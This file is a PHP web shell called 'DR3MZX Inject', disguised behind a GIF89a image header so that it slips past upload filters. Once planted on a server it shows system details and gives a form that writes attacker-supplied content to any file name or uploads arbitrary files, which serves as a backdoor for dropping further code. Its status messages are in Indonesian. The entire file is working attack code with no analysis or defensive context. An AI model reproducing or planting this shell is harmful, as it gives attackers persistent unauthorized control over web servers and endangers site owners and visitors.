GIF89a?????????????????????!??????????????,?????????????????????D???;????
<?php
print('<pre />
#######################################################
##         DR3MZX Inject      ##
#######################################################
');
//http://st3cycling.com/.txt


error_reporting(0);
$content = stripslashes($_POST['content']); $cfile = $_POST['cfile']; $ufile = $_POST['ufile'];
echo '<BLINK><title>---===[d3b~X]===---</title></BLINK>'; 
echo '<b><br>'.php_uname().'<br></b>'; 
echo '<form action="" method="post" enctype="multipart/form-data" name="aw" id="aw">'; 
echo '<textarea name=content style="width:625px;height:300px;background:#000; font-size: 15px bolder; 
color: #00ff00; font-family: "Courier New" >'.$content.'</textarea><br>'; 
echo '<input type="text" name="cfile" size="10" value="newfile.php" style="background:#000; font-size: 15px; 
color: #00ff00; font-family: "Courier New";">'; 
echo '<input name="_create" type="submit" id="_upl" value="Create" style="background:#000; font-size: 15px; 
color: #00ff00; font-family: "Courier New";" >'; 
echo '<input type="file" name="file" size="30"><input type="text" style="background:#000; font-size: 15px; 
color: #00ff00; font-family: "Courier New";" name="ufile" size="10" value="newfile.php">'; 
echo '<input name="_upload" type="submit" id="_upl" value="Upload" style="background:#000; font-size: 15px; 
color: #00ff00; font-family: "Courier New";"></form>'; 
 if($_POST['_create']){ 
  $handle = fopen($cfile, 'w'); 
  if($handle){ 
      if (fwrite($handle, $content) === FALSE) { echo "<b>Membuat $cfile GAGAL</b><br>"; } 
      else { echo "<b>Membuat $cfile Mantapzz !!!</b><br>"; } fclose($handle); 
  } else { echo '<b>Membuat File GAGAL Bro</b><br><br>'; } 
  } 
  if($_POST['_upload']){ 
  if(@copy($_FILES['file']['tmp_name'], $ufile)) { echo "<b>Upload $ufile Mantapzz !!!</b><br><br></font>"; } 
  else { echo "<b>Upload $ufile GAGAL bro !!!</b><br><br>"; } 
  } 
 ?>
